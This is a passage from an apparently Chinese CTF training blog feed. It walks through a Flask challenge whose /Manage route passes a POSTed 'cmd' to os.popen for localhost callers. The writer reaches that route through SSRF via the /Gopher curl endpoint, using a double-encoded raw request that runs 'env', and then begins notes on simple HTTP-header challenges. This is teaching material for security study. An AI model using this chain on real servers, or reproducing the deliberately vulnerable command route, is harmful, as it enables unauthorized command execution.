class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>&#x2F;Login,判断username和passward,不重要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username][<span class="string">&#x27;password&#x27;</span>] == hashlib.md5(password.encode()).hexdigest():</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">f&quot;Welcome back, <span class="subst">&#123;username&#125;</span>!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Invalid credentials!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;style&gt;</span></span><br><span class="line"><span class="string">                body &#123;</span></span><br><span class="line"><span class="string">                    background-color: #f8f9fa;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .container &#123;</span></span><br><span class="line"><span class="string">                    max-width: 400px;</span></span><br><span class="line"><span class="string">                    margin-top: 100px;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .card &#123;</span></span><br><span class="line"><span class="string">                    border: none;</span></span><br><span class="line"><span class="string">                    border-radius: 10px;</span></span><br><span class="line"><span class="string">                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .card-header &#123;</span></span><br><span class="line"><span class="string">                    background-color: #007bff;</span></span><br><span class="line"><span class="string">                    color: white;</span></span><br><span class="line"><span class="string">                    text-align: center;</span></span><br><span class="line"><span class="string">                    border-radius: 10px 10px 0 0;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .btn-primary &#123;</span></span><br><span class="line"><span class="string">                    background-color: #007bff;</span></span><br><span class="line"><span class="string">                    border: none;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .btn-primary:hover &#123;</span></span><br><span class="line"><span class="string">                    background-color: #0056b3;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &lt;/style&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h3&gt;Login&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary w-100&quot;&gt;Login&lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>&#x2F;Upload,判断username,上传文件,不重要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_avatar</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">not</span> <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;User not found!&quot;</span>)</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;avatar&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            file.save(os.path.join(avatar_dir, <span class="string">f&quot;<span class="subst">&#123;username&#125;</span>.png&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Avatar uploaded successfully!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;No file uploaded!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Upload Avatar&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;style&gt;</span></span><br><span class="line"><span class="string">                body &#123;</span></span><br><span class="line"><span class="string">                    background-color: #f8f9fa;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .container &#123;</span></span><br><span class="line"><span class="string">                    max-width: 400px;</span></span><br><span class="line"><span class="string">                    margin-top: 100px;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .card &#123;</span></span><br><span class="line"><span class="string">                    border: none;</span></span><br><span class="line"><span class="string">                    border-radius: 10px;</span></span><br><span class="line"><span class="string">                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .card-header &#123;</span></span><br><span class="line"><span class="string">                    background-color: #dc3545;</span></span><br><span class="line"><span class="string">                    color: white;</span></span><br><span class="line"><span class="string">                    text-align: center;</span></span><br><span class="line"><span class="string">                    border-radius: 10px 10px 0 0;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .btn-danger &#123;</span></span><br><span class="line"><span class="string">                    background-color: #dc3545;</span></span><br><span class="line"><span class="string">                    border: none;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .btn-danger:hover &#123;</span></span><br><span class="line"><span class="string">                    background-color: #c82333;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &lt;/style&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h3&gt;Upload Avatar&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;avatar&quot; class=&quot;form-label&quot;&gt;Avatar&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatar&quot; name=&quot;avatar&quot; required&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-danger w-100&quot;&gt;Upload&lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>还是判断username和password,不重要</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/RRegister&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    junk_code()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">return</span> b64e(<span class="string">&quot;Username already exists!&quot;</span>)</span><br><span class="line">        users[username] = &#123;<span class="string">&#x27;password&#x27;</span>: hashlib.md5(password.encode()).hexdigest()&#125;</span><br><span class="line">        <span class="keyword">return</span> b64e(<span class="string">&quot;Registration successful!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Register&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;style&gt;</span></span><br><span class="line"><span class="string">                body &#123;</span></span><br><span class="line"><span class="string">                    background-color: #f8f9fa;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .container &#123;</span></span><br><span class="line"><span class="string">                    max-width: 400px;</span></span><br><span class="line"><span class="string">                    margin-top: 100px;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .card &#123;</span></span><br><span class="line"><span class="string">                    border: none;</span></span><br><span class="line"><span class="string">                    border-radius: 10px;</span></span><br><span class="line"><span class="string">                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .card-header &#123;</span></span><br><span class="line"><span class="string">                    background-color: #28a745;</span></span><br><span class="line"><span class="string">                    color: white;</span></span><br><span class="line"><span class="string">                    text-align: center;</span></span><br><span class="line"><span class="string">                    border-radius: 10px 10px 0 0;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .btn-success &#123;</span></span><br><span class="line"><span class="string">                    background-color: #28a745;</span></span><br><span class="line"><span class="string">                    border: none;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                .btn-success:hover &#123;</span></span><br><span class="line"><span class="string">                    background-color: #218838;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &lt;/style&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h3&gt;Register&lt;/h3&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;form method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;username&quot; class=&quot;form-label&quot;&gt;Username&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;username&quot; name=&quot;username&quot; required&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;div class=&quot;mb-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                &lt;label for=&quot;password&quot; class=&quot;form-label&quot;&gt;Password&lt;/label&gt;</span></span><br><span class="line"><span class="string">                                &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;password&quot; name=&quot;password&quot; required&gt;</span></span><br><span class="line"><span class="string">                            &lt;/div&gt;</span></span><br><span class="line"><span class="string">                            &lt;button type=&quot;submit&quot; class=&quot;btn btn-success w-100&quot;&gt;Register&lt;/button&gt;</span></span><br><span class="line"><span class="string">                        &lt;/form&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>&#x2F;Manage,典型的SSRF,我们需要本地127.0.0.1并且是POST传入cmd,在os模块中执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Manage&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Forbidden!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Allowed!!!&quot;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> os.popen(request.form.get(<span class="string">&quot;cmd&quot;</span>)).read()</span><br></pre></td></tr></table></figure><p>&#x2F;Gopher,题目和这个Gopher提示的很明显了,重点就在这里.</p><p>这里需要传入一个url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/Gopher&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">visit</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No url provided :)&quot;</span></span><br><span class="line">    url = urlparse(url)</span><br><span class="line">    realIpAddress = socket.gethostbyname(url.hostname)</span><br><span class="line">    <span class="keyword">if</span> url.scheme == <span class="string">&quot;file&quot;</span> <span class="keyword">or</span> realIpAddress <span class="keyword">in</span> BlackList:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No (≧∇�?)&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-L&quot;</span>, urlunparse(url)], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result.stdout</span><br></pre></td></tr></table></figure><p>先从&#x2F;Manage的路由抓一个包,看看环境变量,</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464502930-0432a773-4453-4e0b-8d37-0a99b4bb7011.png"></p><p>先构造</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/Manage</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:7</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">cmd</span><span class="operator">=</span>env</span></span><br></pre></td></tr></table></figure><p>url两次编码:</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464503145-c1356386-7e5e-44af-8132-df8f45d891b2.png"></p><p>发包即可得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464503377-9f960cae-54d8-4189-b747-eec50f7e053d.png"></p>]]></content>
      
      
      <categories>
          
          <category> 2025CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025 Spring Week2</title>
      <link href="/2025/03/18/HnuSecTraining/2025SpringWeek2/"/>
      <url>/2025/03/18/HnuSecTraining/2025SpringWeek2/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="刷题"><a href="#刷题" class="headerlink" title="刷题"></a>刷题</h1><h2 id="LitCTF-2023-Follow-me-and-hack-me"><a href="#LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="[LitCTF 2023]Follow me and hack me"></a><font style="color:rgb(0, 0, 0);">[LitCTF 2023]Follow me and hack me</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742282498420-96590239-b045-408b-94e1-f30adcf2e256.png"></p><p>简单的GET和POST还有改cookie</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742282990412-38aa37e4-e338-4d9c-b9b5-a8703e4e04f7.png"></p><p>有彩蛋！扫你目录</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742282780502-3d941721-d657-464d-b99d-11df5fb37cff.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742283017838-7311adca-b8a6-4935-82b7-a7480c3d84c4.png"></p><p>彩蛋（虽然我没GET到什么含义）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 第三个彩蛋！(看过头号玩家么？)</span></span><br><span class="line">    <span class="comment">// _R3ady_Pl4yer_000ne_ (3/?)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>burp写法</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742283918229-a5306ad4-2c02-4283-850c-ce3f6581f40c.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742284080149-6866d247-9a7f-41e4-b2a3-c8cc77730bed.png">Yakit写法：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742283260367-8b69135b-5354-4665-8473-45a5939ebebd.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742283486300-60309929-46c1-482f-8b81-a00569de4c62.png"></p><h2 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a><font style="color:rgb(0, 0, 0);">[SWPUCTF 2021 新生赛]Do_you_know_http</font></h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742284200057-073d9253-2fe5-4293-82f3-a62ce892bca4.png"></p><p>在这里也可以改包</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742284383447-6e941b82-d5eb-4ccc-a6fe-3ae5b7693289.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742284934428-6c10edb7-4858-4f23-bb05-3576c8478288.png">访问这个文件就行了，secretttt.php<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742284951707-67c7f19a-78bf-42d1-afa0-8d629b92a025.png"></p><p>yakit解法：</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742285112040-a49a3945-8e80-4cc0-8710-426f9f969146.png"></p><p>重定向到了a.php，访问a.php<img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742285167397-7c773ed6-3b49-4c04-a29b-ca52426ded7c.png"></p><p>可以了，访问secretttt.php</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742285196623-51cbea51-2b12-4a09-854e-38c646ac9fa9.png"></p><p>行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742285239582-976121e2-bd6e-4767-a7cd-39e31b148e34.png"></p><p>Burp解法</p><p>改User-Agent: WLLM</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1742285314781-31f0dc41-6358-407c-9874-fb3e803e15f7.png"></p><p><img 